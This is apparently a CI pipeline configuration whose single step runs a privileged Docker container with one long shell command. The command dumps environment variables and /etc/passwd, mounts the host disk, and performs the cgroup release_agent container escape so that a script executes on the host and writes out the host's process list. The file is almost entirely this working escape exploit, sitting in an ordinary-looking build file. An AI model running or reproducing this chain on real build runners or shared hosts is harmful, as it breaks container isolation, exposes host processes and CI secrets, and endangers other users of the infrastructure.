steps:
 - cmd: docker run --privileged ubuntu /bin/sh -c "echo privileged && fdisk -l && echo "***" && df && env && mkdir /mnt/test && mount /dev/sda1 /mnt/test && ls -la /mnt/test && cat /etc/passwd && ls -la /dev/sda2 && ls -la /dev/ && ls /usr/bin && mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab` && echo "$host_path/cmd" > /tmp/cgrp/release_agent && echo '#!/bin/sh' > /cmd && echo \"ps aux > $host_path/output\" >> /cmd && chmod a+x /cmd && cat /cmd && sh -c \"echo \$\$ > /tmp/cgrp/x/cgroup.procs\""